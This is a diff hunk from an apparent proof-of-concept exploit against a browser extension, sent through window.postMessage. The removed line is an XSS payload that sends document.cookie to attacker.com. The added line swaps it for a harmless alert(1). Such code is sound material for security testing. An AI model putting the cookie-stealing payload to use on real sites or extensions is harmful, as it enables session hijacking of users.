@@ -22,7 +22,7 @@
                 console.log('Target page loaded, sending exploit message...');
                 
                 // XSS payload that would steal cookies
-                const xssPayload = '<script>fetch("https://attacker.com/steal?cookie="+encodeURIComponent(document.cookie))<\/script>';
+                const xssPayload = '<script>alert(1)<\/script>';
                 
                 // Send message that will be processed by the extension
                 window.postMessage({
